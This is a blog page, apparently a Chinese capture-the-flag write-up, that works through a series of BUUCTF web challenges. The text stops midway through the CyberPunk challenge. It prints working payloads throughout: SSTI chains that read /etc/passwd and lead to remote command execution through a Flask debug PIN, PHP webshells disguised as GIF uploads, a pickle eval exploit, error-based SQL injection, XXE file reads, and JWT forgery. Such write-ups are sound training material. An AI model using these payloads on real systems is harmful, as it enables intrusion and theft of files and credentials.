<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>BUUCTF WEB page3 | w8nn9z Blog</title>
<meta name="keywords" content="">
<meta name="description" content="BUUCTF WEB page3 - w8nn9z Blog">
<meta name="author" content="">
<link rel="canonical" href="https://z9nn8w.github.io/posts/ctf/buuojpage3/">

<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="" rel="preload stylesheet" as="style">
<link rel="icon" href="https://z9nn8w.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://z9nn8w.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://z9nn8w.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://z9nn8w.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://z9nn8w.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://z9nn8w.github.io/posts/ctf/buuojpage3/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/ctf/buuojpage3/">
  <meta property="og:site_name" content="w8nn9z Blog">
  <meta property="og:title" content="BUUCTF WEB page3">
  <meta property="og:locale" content="zh-cn">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-08-10T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-08-19T00:00:00+00:00">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="BUUCTF WEB page3">
<meta name="twitter:description" content="">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://z9nn8w.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CTF",
      "item": "https://z9nn8w.github.io/posts/ctf/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "BUUCTF WEB page3",
      "item": "https://z9nn8w.github.io/posts/ctf/buuojpage3/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "BUUCTF WEB page3",
  "name": "BUUCTF WEB page3",
  "description": "",
  "keywords": [
    
  ],
  "articleBody": "[GYCTF2020]FlaskApp decode路由存在SSTI，如果直接获取__subclasses__()，由于资源太多导致网站直接502了，尝试一次获取100个，找到os._wrap_close：\n{{().__class__.__bases__[0].__subclasses__()[127]}}\re3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbMTI3XX19 但是过滤了system，由于flask开启了debug，考虑获取PIN码，先获取_frozen_importlib位置：\n{{().__class__.__bases__[0].__subclasses__()[75]}}\re3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdfX0= 获取username：\n{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}\re3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fLl9fYnVpbHRpbnNfX1snb3BlbiddKCcvZXRjL3Bhc3N3ZCcpLnJlYWQoKX19\rroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin flaskweb:x:1000:1000::/home/flaskweb:/bin/sh 获取/etc/machine-id：\n{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/machine-id').read()}}\re3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fLl9fYnVpbHRpbnNfX1snb3BlbiddKCcvZXRjL21hY2hpbmUtaWQnKS5yZWFkKCl9fQ==\r1408f836b0ca514d796cbf8960e45fa1 获取uuidnode：\n{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/sys/class/net/eth0/address').read()}}\re3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fLl9fYnVpbHRpbnNfX1snb3BlbiddKCcvc3lzL2NsYXNzL25ldC9ldGgwL2FkZHJlc3MnKS5yZWFkKCl9fQ==\rd2:7b:56:a5:0e:2d 对应十进制数值为231427176468013 报错获取app.py绝对路径：\n/usr/local/lib/python3.7/site-packages/flask/app.py 算出PIN码255-971-270，访问console路由进行rce：\n__import__('os').popen('cat /this_is_the_flag.txt').read()\r'flag{df780c8c-7265-468e-bfce-c04079d78e67}\\n' 参考文章：\nhttps://www.freebuf.com/articles/web/359392.html\nhttps://xz.aliyun.com/news/2235#toc-2\n[FBCTF2019]RCEService 原题给了源码：\n\u003c?php putenv('PATH=/home/rceservice/jail'); if (isset($_REQUEST['cmd'])) { $json = $_REQUEST['cmd']; if (!is_string($json)) { echo 'Hacking attempt detected'; } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/', $json)) { echo 'Hacking attempt detected'; } else { echo 'Attempting to run command:'; $cmd = json_decode($json, true)['cmd']; if ($cmd !== NULL) { system($cmd); } else { echo 'Invalid input'; } echo ''; } } ?\u003e 由于preg_match匹配开头和结尾为除换行符以外的所有字符，所以可以尝试换行符%0A绕过：\n?cmd={%0a\"cmd\":\"ls%20/\"%0a} 匹配到开头为{，中间为%0a，由于后面还有一个%0a，不满足.*$，所以匹配结果为false，但是php的preg_match好像不会管字符串最后的换行符\n找出flag位置，由于设置了PATH，用绝对路径执行命令即可：\n?cmd={%0a\"cmd\":\"ls%20/home/rceservice\"%0a}\rflag\rjail\r?cmd={%0a\"cmd\":\"/bin/cat%20/home/rceservice/flag\"%0a}\rflag{24ba5085-75cf-45bd-aef3-46ffa53a6018} 在线匹配正则的网站\n[Zer0pts2020]Can you guess it? \u003c?php include 'config.php'; // FLAG is defined in config.php if (preg_match('/config\\.php\\/*$/i', $_SERVER['PHP_SELF'])) { exit(\"I don't know what you are thinking, but I won't let you read it :)\"); } if (isset($_GET['source'])) { highlight_file(basename($_SERVER['PHP_SELF'])); exit(); } $secret = bin2hex(random_bytes(64)); if (isset($_POST['guess'])) { $guess = (string) $_POST['guess']; if (hash_equals($secret, $guess)) { $message = 'Congratulations! The flag is: ' . FLAG; } else { $message = 'Wrong.'; } } ?\u003e 利用basename的漏洞：\n/index.php/config.php/%ff?source\r\u003c?php\rdefine('FLAG', 'flag{f7488202-3627-4482-8c75-39fa925f8d72}'); 参考文章：\nhttps://blog.51cto.com/xunansec/5356203\n[0CTF 2016]piapiapia www.zip源码泄露\nindex.php：\n\u003c?php require_once('class.php'); if($_SESSION['username']) { header('Location: profile.php'); exit; } if($_POST['username'] \u0026\u0026 $_POST['password']) { $username = $_POST['username']; $password = $_POST['password']; if(strlen($username) \u003c 3 or strlen($username) \u003e 16) die('Invalid user name'); if(strlen($password) \u003c 3 or strlen($password) \u003e 16) die('Invalid password'); if($user-\u003elogin($username, $password)) { $_SESSION['username'] = $username; header('Location: profile.php'); exit;\t} else { die('Invalid user name or password'); } } else { ?\u003e register.php：\n\u003c?php require_once('class.php'); if($_POST['username'] \u0026\u0026 $_POST['password']) { $username = $_POST['username']; $password = $_POST['password']; if(strlen($username) \u003c 3 or strlen($username) \u003e 16) die('Invalid user name'); if(strlen($password) \u003c 3 or strlen($password) \u003e 16) die('Invalid password'); if(!$user-\u003eis_exists($username)) { $user-\u003eregister($username, $password); echo 'Register OK!Please Login';\t} else { die('User name Already Exists'); } } else { ?\u003e update.php：\n\u003c?php require_once('class.php'); if($_SESSION['username'] == null) { die('Login First');\t} if($_POST['phone'] \u0026\u0026 $_POST['email'] \u0026\u0026 $_POST['nickname'] \u0026\u0026 $_FILES['photo']) { $username = $_SESSION['username']; if(!preg_match('/^\\d{11}$/', $_POST['phone'])) die('Invalid phone'); if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email'])) die('Invalid email'); if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) \u003e 10) die('Invalid nickname'); $file = $_FILES['photo']; if($file['size'] \u003c 5 or $file['size'] \u003e 1000000) die('Photo size error'); move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name'])); $profile['phone'] = $_POST['phone']; $profile['email'] = $_POST['email']; $profile['nickname'] = $_POST['nickname']; $profile['photo'] = 'upload/' . md5($file['name']); $user-\u003eupdate_profile($username, serialize($profile)); echo 'Update Profile Success!Your Profile'; } else { ?\u003e profile.php：\n\u003c?php require_once('class.php'); if($_SESSION['username'] == null) { die('Login First');\t} $username = $_SESSION['username']; $profile=$user-\u003eshow_profile($username); if($profile == null) { header('Location: update.php'); } else { $profile = unserialize($profile); $phone = $profile['phone']; $email = $profile['email']; $nickname = $profile['nickname']; $photo = base64_encode(file_get_contents($profile['photo'])); ?\u003e class.php：\n\u003c?php require('config.php'); class user extends mysql{ private $table = 'users'; public function is_exists($username) { $username = parent::filter($username); $where = \"username = '$username'\"; return parent::select($this-\u003etable, $where); } public function register($username, $password) { $username = parent::filter($username); $password = parent::filter($password); $key_list = Array('username', 'password'); $value_list = Array($username, md5($password)); return parent::insert($this-\u003etable, $key_list, $value_list); } public function login($username, $password) { $username = parent::filter($username); $password = parent::filter($password); $where = \"username = '$username'\"; $object = parent::select($this-\u003etable, $where); if ($object \u0026\u0026 $object-\u003epassword === md5($password)) { return true; } else { return false; } } public function show_profile($username) { $username = parent::filter($username); $where = \"username = '$username'\"; $object = parent::select($this-\u003etable, $where); return $object-\u003eprofile; } public function update_profile($username, $new_profile) { $username = parent::filter($username); $new_profile = parent::filter($new_profile); $where = \"username = '$username'\"; return parent::update($this-\u003etable, 'profile', $new_profile, $where); } public function __tostring() { return __class__; } } class mysql { private $link = null; public function connect($config) { $this-\u003elink = mysql_connect( $config['hostname'], $config['username'], $config['password'] ); mysql_select_db($config['database']); mysql_query(\"SET sql_mode='strict_all_tables'\"); return $this-\u003elink; } public function select($table, $where, $ret = '*') { $sql = \"SELECT $ret FROM $table WHERE $where\"; $result = mysql_query($sql, $this-\u003elink); return mysql_fetch_object($result); } public function insert($table, $key_list, $value_list) { $key = implode(',', $key_list); $value = '\\'' . implode('\\',\\'', $value_list) . '\\''; $sql = \"INSERT INTO $table ($key) VALUES ($value)\"; return mysql_query($sql); } public function update($table, $key, $value, $where) { $sql = \"UPDATE $table SET $key = '$value' WHERE $where\"; return mysql_query($sql); } public function filter($string) { $escape = array('\\'', '\\\\\\\\'); $escape = '/' . implode('|', $escape) . '/'; // $escape = '/\\|\\\\\\\\/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; // $safe = '/select|insert|update|delete|where/i'; return preg_replace($safe, 'hacker', $string); } public function __tostring() { return __class__; } } session_start(); $user = new user(); $user-\u003econnect($config); PHP版本为5.6.40，主要关注update.php中的序列化，profile.php中的反序列化以及class.php中的filter函数，登录注册等页面都不存在sql注入。尝试在profile.php中获取到config.php的文件内容，但是update.php中的photo无法通过传参控制，结合class.php中filter函数对过滤字符where更换为hacker的操作，导致字符变多，考虑利用 数组绕过preg_match+数组绕过strlen+字符串逃逸 的方法在nickname处恶意构造序列化字符串：\n------geckoformboundary1ede678c1f95225cf35256bb0ab372c1\rContent-Disposition: form-data; name=\"phone\"\r12345678901\r------geckoformboundary1ede678c1f95225cf35256bb0ab372c1\rContent-Disposition: form-data; name=\"email\"\r114514@qq.com\r------geckoformboundary1ede678c1f95225cf35256bb0ab372c1\rContent-Disposition: form-data; name=\"nickname[]\"\rwherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";}\r------geckoformboundary1ede678c1f95225cf35256bb0ab372c1\rContent-Disposition: form-data; name=\"photo\"; filename=\"test.php\"\rContent-Type: application/php\rtesttesttest\r------geckoformboundary1ede678c1f95225cf35256bb0ab372c1-- 访问profile.php就可以获取base64数据流，解码可得config.php：\n\u003c?php $config['hostname'] = '127.0.0.1'; $config['username'] = 'root'; $config['password'] = 'qwertyuiop'; $config['database'] = 'challenges'; $flag = 'flag{4ca493b0-6039-4a8e-9dae-6dd61a58d279}'; ?\u003e 多版本PHP环境在线测试\n[SUCTF 2019]Pythonginx 本题的环境好像已经无法获取flag了\n@app.route('/getUrl', methods=['GET', 'POST']) def getUrl(): url = request.args.get(\"url\") host = parse.urlparse(url).hostname if host == 'suctf.cc': return \"我扌 your problem? 111\" parts = list(urlsplit(url)) host = parts[1] if host == 'suctf.cc': return \"我扌 your problem? 222 \" + host newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname if host == 'suctf.cc': return urllib.request.urlopen(finalUrl).read() else: return \"我扌 your problem? 333 idna解析非ascii字符标准化问题：\nfile://suctf.ⅽc/../../../etc/passwd 相关工具：\n搜索相似的unicode字符网站\nUnicode fuzzer\n参考文章：\nhttps://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf\nhttps://www.tr0y.wang/2020/08/18/IDN/\n[MRCTF2020]套娃 $query = $_SERVER['QUERY_STRING']; if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){ die('Y0u are So cutE!'); } if($_GET['b_u_p_t'] !== '23333' \u0026\u0026 preg_match('/^23333$/', $_GET['b_u_p_t'])){ echo \"you are going to the next ~\"; } 传参中不能出现下划线，但是php有将特殊符号参数名解析为下划线的特性，preg_match默认单行匹配不会匹配结尾的%0a即换行符：\n?b+u+p+t=23333%0A\r或?b u p t=23333%0A\rhow smart you are ~\rFLAG is in secrettw.php secrettw.php页面源码注释中有一段jsfuck，控制台运行一下：\npost me Merak secrettw.php：\n\u003c?php error_reporting(0); include 'takeip.php'; ini_set('open_basedir','.'); include 'flag.php'; if(isset($_POST['Merak'])){ highlight_file(__FILE__); die(); } function change($v){ $v = base64_decode($v); $re = ''; for($i=0;$i\u003cstrlen($v);$i++){ $re .= chr ( ord ($v[$i]) + $i*2 ); } return $re; } echo 'Local access only!'.\"\"; $ip = getIp(); if($ip!='127.0.0.1') echo \"Sorry,you don't have permission! Your ip is :\".$ip; if($ip === '127.0.0.1' \u0026\u0026 file_get_contents($_GET['2333']) === 'todat is a happy day' ){ echo \"Your REQUEST is:\".change($_GET['file']); echo file_get_contents(change($_GET['file'])); } ?\u003e 测试可知getIP检测的是Client-IP头：\n?2333=data://,todat%20is%20a%20happy%20day\u0026file=ZmpdYSZmXGI= Flag is here~But how to get it?Local access only!\u003cbr/\u003eYour REQUEST is:flag.php\u003c?php $flag = 'flag{902b4616-9d7d-49a9-9b98-1b5b1a15833a}'; echo \"Flag is here~But how to get it?\"; ?\u003e 参考文章：\nhttps://www.cnblogs.com/hithub/p/16804708.html\n[CSCCTF 2019 Qual]FlaskLight 测试了一下得知是python2：\nwaf过滤了global和system，用request.arg来绕过：\n?search={{()[request.args.v1][request.args.v2][-1][request.args.v3]()[58][request.args.v4][request.args.v5][request.args.v6][request.args.v7](request.args.v8)}}\u0026v1=__class__\u0026v2=__mro__\u0026v3=__subclasses__\u0026v4=__init__\u0026v5=__globals__\u0026v6=__builtins__\u0026v7=eval\u0026v8=__import__(\"os\").popen(\"cat /fla*/coomme_geeeett_youur_flek\").read() flag{b658a75b-8b7e-4298-907f-b06701d89bf8}\n[watevrCTF-2019]Cookie Store Cookie中的session只经过base64编码，解码可得明文内容，伪造money:100即可，购买flag：\nSet-Cookie: session=eyJtb25leSI6IDAsICJoaXN0b3J5IjogWyJZdW1teSBjaG9jb2xhdGUgY2hpcCBjb29raWUiLCAiZmxhZ3szMTM2YTZmNC03YjhlLTQ0MmUtYjFiYy00NzcyNzFlNzJkMDd9XG4iXX0=; {\"money\": 0, \"history\": [\"Yummy chocolate chip cookie\", \"flag{3136a6f4-7b8e-442e-b1bc-477271e72d07}\\n\"]} [WUSTCTF2020]CV Maker 登录成功后有个文件上传，上传空文件可以看到warning：\nWarning: exif_imagetype(): Filename cannot be empty in /var/www/html/profile.php on line 76 查了一下exif_imagetype()，这个函数通过读取图像的前几个字节并检查其签名来工作，上传一句话木马：\nContent-Disposition: form-data; name=\"upload_file\"; filename=\"shell.php\"\rContent-Type: application/gif\rGIF89a\u003c?php @eval($_POST[\"shell\"]); ?\u003e 蚁剑连上拿flag：flag{c976d3cc-196a-4b97-b6be-b4a8911c6e7d}\n[CISCN2019 华北赛区 Day1 Web2]ikun 网页中有一段话：\nikun们冲鸭,一定要买到lv6!!! 尝试先找到lv6的page页数：\nimport requests url = \"http://49170cc3-3b88-4c25-972e-e197bf95c016.node5.buuoj.cn:81/shop\" for i in range(500): params = {\"page\":f\"{i}\"} resp = requests.get(url, params) if (\"/static/img/lv/lv6.png\" in resp.text): print(\"Found page: \" + str(i)) # Found page: 181 购买前需要登录，直接买钱是不够的，抓包看一下，发现可以改折扣：\n_xsrf=2%7C807606a1%7C9140beb256c835e2363761153abb462b%7C1755505534\u0026id=1624\u0026price=1145141919.0\u0026discount=0.00000001 之后会跳转到：/b1g_m4mber，不过只有admin才能访问，尝试伪造JWT，尝试爆破得到密钥：1Kun，修改username为admin：\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo 网页源码给出了提示，存在备份文件:\n\u003ca href=\"/static/asd1f654e683wq/www.zip\" \u003e\u003cspan style=\"visibility:hidden\"\u003e删库跑路前我留了好东西在这里\u003c/span\u003e\u003c/a\u003e Admin.py中存在pickle反序列化漏洞：\nimport tornado.web from sshop.base import BaseHandler import pickle import urllib class AdminHandler(BaseHandler): @tornado.web.authenticated def get(self, *args, **kwargs): if self.current_user == \"admin\": return self.render('form.html', res='This is Black Technology!', member=0) else: return self.render('no_ass.html') @tornado.web.authenticated def post(self, *args, **kwargs): try: become = self.get_argument('become') p = pickle.loads(urllib.unquote(become)) return self.render('form.html', res=p, member=1) except: return self.render('form.html', res='This is Black Technology!', member=0) python2环境，exp.py：\nimport pickle from urllib import quote class payload(object): def __reduce__(self): return (eval, (\"open('/flag.txt','r').read()\",)) a = pickle.dumps(payload()) a = quote(a) print(a) 补上_xsrf，传参become=c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.\nflag{e5e38db3-dd24-4248-81f0-02e9ae2fe8f0}\n[红明谷CTF 2021]write_shell function check($input){ if(preg_match(\"/'| |_|php|;|~|\\\\^|\\\\+|eval|{|}/i\",$input)){ // if(preg_match(\"/'| |_|=|php/\",$input)){ die('hacker!!!'); }else{ return $input; } } 过滤了eval还有下划线导致一句话木马和许多执行系统命令的函数无法使用，同时过滤了php导致常规的\u003c?php ?\u003e无法写入文件，想到两种方法绕过\n方法一：短标签+assert+hex2bin构造一句话木马\n\u003c?=assert(hex2bin(\"6576616c28245f524551554553545b277368656c6c275d293b\"))?\u003e\r即\u003c?=assert(eval($_REQUEST['shell']);)?\u003e 蚁剑连上找到flag：flag{ba1d16ab-0fef-46cb-977c-3f2aea47a494}\n方法二：短标签+反引号执行系统命令并返回结果+%09绕过空格\n\u003c?=`cat%09/flllllll1112222222lag`?\u003e [RCTF2015]EasySQL 修改密码处存在报错注入，username是双引号闭合的，注册时进行注入即可，过滤了空格 and or mid left right substring：\n114\"||updatexml(1,concat(0x7e,database()),1)#\rXPATH syntax error: '~web_sqli'\r114\"||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1)#\rXPATH syntax error: '~article,flag,users'\r114\"||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='flag'))),1)#\rXPATH syntax error: '~flag'\r114\"||updatexml(1,concat(0x7e,(select(flag)from(flag))),1)#\rXPATH syntax error: '~RCTF{Good job! But flag not her'\r114\"||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users'))),1)#\rXPATH syntax error: '~name,pwd,email,real_flag_1s_her'\r114\"||updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('flag'))),1)#\rXPATH syntax error: '~flag{6c7b5915-cce7-456b-895e-1c'\r114\"||updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('flag')))),1)#\rXPATH syntax error: '~}a64df4b619c1-e598-b654-7ecc-51' flag{6c7b5915-cce7-456b-895e-1c916b4fd46a}\n[GWCTF 2019]枯燥的抽奖 check.php：\n\u003c?php #这不是抽奖程序的源代码！不许看！ header(\"Content-Type: text/html;charset=utf-8\"); session_start(); if(!isset($_SESSION['seed'])){ $_SESSION['seed']=rand(0,999999999); } mt_srand($_SESSION['seed']); $str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; $str=''; $len1=20; for ( $i = 0; $i \u003c $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); } $str_show = substr($str, 0, 10); echo \"\".$str_show.\"\n\"; if(isset($_POST['num'])){ if($_POST['num']===$str){x echo \"抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}\n\"; } else{ echo \"没抽中哦，再试试吧\n\"; } } show_source(\"check.php\"); 使用php_mt_seed工具，生成该工具参数所需的格式：\nd = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ' c = 'Z1wu33G2yq' output = '' for s in c: output += str(d.index(s)) + ' ' + str(d.index(s)) + ' 0 61 ' print(output) $ ./php_mt_seed 60 60 0 61 37 37 0 61 16 16 0 61 53 53 0 61 33 33 0 61 33 33 0 61 20 20 0 61 6 6 0 61 11 11 0 61 61 61 0 61 Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 Version: 3.0.7 to 5.2.0 Found 0, trying 0xe0000000 - 0xffffffff, speed 2505.4 Mseeds/s Version: 5.2.1+ Found 0, trying 0x00000000 - 0x0fffffff, speed 0.0 Mseeds/s seed = 0x013e80f3 = 12559208 (PHP 7.1.0+) Found 1, trying 0xb0000000 - 0xbfffffff, speed 210.6 Mseeds/s 根据seed生成20位字符串：\n\u003c?php mt_srand(12559208); $str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; $str=''; $len1=20; for ( $i = 0; $i \u003c $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); } $str_show = substr($str, 0, 20); echo $str_show; ?\u003e Z1wu33G2yq3xInpVgJAj，抽奖，就是那么枯燥且无味，给你flag{5fe58a16-cc68-47aa-9811-a11f87a7b657}\n[NCTF2019]True XML cookbook 存在XXE外部实体注入漏洞：\n\u003c!DOCTYPE a [ \u003c!ENTITY file SYSTEM \"file:///etc/passwd\"\u003e ]\u003e \u0026file;114514 用php伪协议读取doLogin.php源码：\n\u003c!DOCTYPE a [ \u003c!ENTITY file SYSTEM \"php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php\"\u003e ]\u003e \u0026file;114514 doLogin.php：\n\u003c?php /** * autor: c0ny1 * date: 2018-2-7 */ $USERNAME = 'admin'; //账号 $PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //密码 $result = null; libxml_disable_entity_loader(false); $xmlfile = file_get_contents('php://input'); try{ $dom = new DOMDocument(); $dom-\u003eloadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-\u003eusername; $password = $creds-\u003epassword; if($username == $USERNAME \u0026\u0026 $password == $PASSWORD){ $result = sprintf(\"%d%s\",1,$username); }else{ $result = sprintf(\"%d%s\",0,$username); }\t}catch(Exception $e){ $result = sprintf(\"%d%s\",3,$e-\u003egetMessage()); } header('Content-Type: text/html; charset=utf-8'); echo $result; ?\u003e 获取/proc/net/fib_trie，探测内网ip：10.244.166.236的C段，爆破得到flag\n[CISCN2019 华北赛区 Day1 Web5]CyberPunk 页面注释有个file，存在文件包含，php伪协议读取源码\nindex.php：\n\u003c?php ini_set('open_basedir', '/var/www/html/'); // $file = $_GET[\"file\"]; $file = (isset($_GET['file']) ? $_GET['file'] : null); if (isset($file)){ if (preg_match(\"/phar|zip|bzip2|zlib|data|input|%00/i\",$file)) { echo('no way!'); exit; } @include($file); } ?\u003e search.php：\n\u003c?php require_once \"config.php\"; if(!empty($_POST[\"user_name\"]) \u0026\u0026 !empty($_POST[\"phone\"])) { $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[\"user_name\"]; $phone = $_POST[\"phone\"]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\"; $fetch = $db-\u003equery($sql); } if (isset($fetch) \u0026\u0026 $fetch-\u003enum_rows\u003e0){ $row = $fetch-\u003efetch_assoc(); if(!$row) { echo 'error'; print_r($db-\u003eerror); exit; } $msg = \"姓名:\".$row['user_name'].\"\n, 电话:\".$row['phone'].\"\n, 地址:\".$row['address'].\"\n\"; } else { $msg = \"未找到订单!\"; } }else { $msg = \"信息不全\"; } ?\u003e change.php：\n\u003c?php require_once \"config.php\"; if(!empty($_POST[\"user_name\"]) \u0026\u0026 !empty($_POST[\"address\"]) \u0026\u0026 !empty($_POST[\"phone\"])) { $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[\"user_name\"]; $address = addslashes($_POST[\"address\"]); $phone = $_POST[\"phone\"]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\"; $fetch = $db-\u003equery($sql); } if (isset($fetch) \u0026\u0026 $fetch-\u003enum_rows\u003e0){ $row = $fetch-\u003efetch_assoc(); $sql = \"update `user` set `address`='\".$address.\"', `old_address`='\".$row['address'].\"' where `user_id`=\".$row['user_id']; $result = $db-\u003equery($sql); if(!$result) { echo 'error'; print_r($db-\u003eerror); exit; } $msg = \"订单修改成功\"; } else { $msg = \"未找到订单!\"; } }else { $msg = \"信息不全\"; } ?\u003e delete.php：\n\u003c?php require_once \"config.php\"; if(!empty($_POST[\"user_name\"]) \u0026\u0026 !empty($_POST[\"phone\"])) { $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[\"user_name\"]; 